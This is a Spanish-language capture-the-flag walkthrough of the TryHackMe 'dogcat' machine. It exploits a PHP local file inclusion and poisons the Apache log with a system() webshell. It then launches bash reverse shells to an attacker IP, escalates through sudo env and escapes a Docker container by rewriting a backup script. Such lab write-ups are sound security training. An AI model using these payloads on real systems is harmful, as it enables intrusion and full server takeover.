Resolucion de la maquina dogcat de dificultad media de la plataforma de TryHackMe.

![](/assets/img/dogcat/machine.png) 

## Enumeracion
Comenzemos escaneando la maquina victima para ver que puertos tiene abiertos
```bash
❯ nmap -p- --open --min-rate 5000 -n -Pn 10.10.158.246
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-11 14:42 -05
Nmap scan report for 10.10.158.246
Host is up (0.17s latency).
Not shown: 65494 filtered tcp ports (no-response), 39 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.49 seconds
```
Intentemos detectar la version que corre en estos dos puertos.
```bash
❯ nmap -sCV -p22,80 10.10.158.246 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-11 14:50 -05
Nmap scan report for 10.10.158.246
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2431192ab1971a044e2c36ac840a7587 (RSA)
|   256 213d461893aaf9e7c9b54c0f160b71e1 (ECDSA)
|_  256 c1fb7d732b574a8bdcd76f49bb3bd020 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.53 seconds
```
Enumeremos el servidor web, al poner la ip vemos esto.
![](/assets/img/dogcat/web.png)

En la web asi de primeras no se ve nada pero abajo en los dos botones que tiene nos lleva a una ruta muy interesante.
![](/assets/img/dogcat/par.png)

Esta mostrando la imagen apartir del parametro view, veamos si este parametro esta bien sanitizado a nivel de codigo o si por el contrario la web es vulnerable a un lfi, si intentamos un path traversal y apuntamos a el archivo /etc/passwd nos pone lo siguiente.
![](/assets/img/dogcat/test.png)
por lo que quiero pensar que la palabra dog o cat tiene que estar siempre al principio, intentemos representar el archivo de dog pero en base64, haciendo uso de un wrapper de codificacion en base64
```bash
php://filter/convert.base64-encode/resource=dog
```
![](/assets/img/dogcat/base.png)

Logramos obtener el archivo en base64, decodifiquemos esta cadena para ver el contenido.
```bash
❯ echo 'PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K'|base64 -d
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
```
El archivo simplemente esta cargando imagen, la cual saca su nombre de un numero random del 1 al 10, por lo que la imagen va a ir cambiando en cada peticion, veamos mas archivos, apuntemos al index.php en la ruta /var/www/html.
![](/assets/img/dogcat/lfi.png)
Bueno vemos que por detras le esta agregando la extension .php al archivo que le indiquemos, Bueno como es index.php simplemente indiquemosle index.
![](/assets/img/dogcat/index.png)
Hay vemos el contenido del archivo index.php en base64, decodifiquemoslo y veamos su contenido, el contenido lo voy a meter al archivo index.php
```bash
❯ echo 'PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==' |base64 -d > index.php
```
Analizemos el archivo.
```bash
❯ /usr/bin/cat index.php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	   $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```
En esta parte del codigo hay definido un parametro por get, cuando el parametro no recibe ningun argumento su valor va hacer .php
```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
```
Vemos que realiza un tipo de validacion en el que el parametro view tenga el valor de dog o de cat, pero esto no esta bien sanitizado, aparte en el include esta cojiendo los valores de dos parametros el parametro view pero tambien el parametro ext, el cual podemos asignarle cualquier valor.
```bash
if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
```

## Intrusion
El parametro view tiene que tener de valor o dog o cat, pero en el otro parametro podemos poner lo que queramos y como esta haciendo un include nos podemos aprovechar de $ext para acontecer el lfi.
```bash
❯ curl -s "http://10.10.158.246/?view=dog&ext=../../../../../../../../../../../../etc/passwd" |awk '/you go!/,/<\/div>/' |sed 's/^ *//'
Here you go!root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</div>
```
Si enumeramos un poco la maquina nos daremos cuenta que no hay nada interesante como claves privadas ni contraseñas pero podemos leer los logs de apache por lo que podemos hacer un log poisoning.
![](/assets/img/dogcat/log.png)

Vale para esto simplemente tenemos que tramitar una consulta que en la cabezera del User-Agent tenga un codigo malicioso en php, para esto voy a usar burpsuite, interceptamos la peticion con burpsuite y le cambiamos la cabezera del User-Agent
```php
<?php system($_GET['cmd']);?>
```

![](/assets/img/dogcat/burp.png)

Ya con esto hemos definido un parametro cmd el cual va a cojer el valor que le indiquemos y lo va a ejecutar con system, ejecutemos un ls -la, para comprabar que funciono.
![](/assets/img/dogcat/ls.png)
Vale ahora lo que quiero es que me envie una consola, lo voy hacer de la siguiente manera, voy a crear un archivo el cual voy a meter en la ruta donde se aloja el servidor web para de esta forma poder ejecutarlo simplemente enviando una peticion.

Creo un archivo que se encargue de enviarme una revershell
```bash
❯ cat rev.php
<?php
  system('bash -c "bash -i >& /dev/tcp/10.8.47.45/4444 0>&1"');
?>
```
Monto un servidor con python
```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Y ahora voy a tramitar una peticion contra mi servidor para meter el contenio de mi archivo rev.php en la ruta /var/www/html/shell.php
```bash
curl 10.8.47.45/rev.php -o /var/www/html/shell.php
```
![](/assets/img/dogcat/rev.png)

Si enviamos una solicitud con curl al archivo se nos interpreta y por debajo recibimos la shell.
```bash
❯ curl -s 10.10.31.185/shell.php
```
```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.47.45] from (UNKNOWN) [10.10.31.185] 52364
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dfc9e4e6d19f:/var/www/html$ whoami
whoami
www-data
www-data@dfc9e4e6d19f:/var/www/html$ 
```
## Escalada de privlegios
Si miramos los privelegios que tenemos a nivel de sudoers podemos ejecutar env como root sin proporcionar contraseña.
```bash
www-data@dfc9e4e6d19f:/$ sudo -l
Matching Defaults entries for www-data on dfc9e4e6d19f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dfc9e4e6d19f:
    (root) NOPASSWD: /usr/bin/env
www-data@dfc9e4e6d19f:/$ 
```
 si no vamos a [gtfobins](https://gtfobins.github.io/gtfobins/env/#sudo) nos muestra la manera de abusar de esto para escalar privelegios.
 ```bash
 www-data@dfc9e4e6d19f:/$ sudo env /bin/bash
root@dfc9e4e6d19f:/# whoami
root
root@dfc9e4e6d19f:/#
```
## Escapar del contenedor
Aqui no acaba esto ya que si miramos la ip estamos dentro de un contenedor.
```bash
root@dfc9e4e6d19f:/# hostname -I
172.17.0.2 
root@dfc9e4e6d19f:/# 
```
Por lo que tenemos que buscar una forma de escapar de aqui y pivotar a la maquina real.

En la ruta /opt/backups hay un archivo interesante.
```bash
root@dfc9e4e6d19f:/opt/backups# cat backup.sh 
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
root@dfc9e4e6d19f:/opt/backups# 
```
Esta creando un archivo y lo esta metiendo en la ruta /root/container pero hay algo extraño este directorio no existe en el directorio root de este contenedor por lo que quiero pensar que lo estan ejecutando desde la maquina real por tanto modifiquemos este archivo para que nos envie una revershell.

```bash
root@dfc9e4e6d19f:/opt/backups# cat backup.sh 
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.8.47.45/443 0>&1"
root@dfc9e4e6d19f:/opt/backups# 
```
Ahora a esperar que este archivo se ejecute, despues de un minuto nos llega la revershell.
```bash
❯ sudo nc -lvnp 443
[sudo] password for blank: 
listening on [any] 443 ...
connect to [10.8.47.45] from (UNKNOWN) [10.10.31.185] 54966
bash: cannot set terminal process group (3253): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# whoami
whoami
root
root@dogcat:~# hostname -I
hostname -I
10.10.31.185 172.17.0.1 
root@dogcat:~#
```
Ahora si estamos como root en la maquina Real, Gracias por leer.
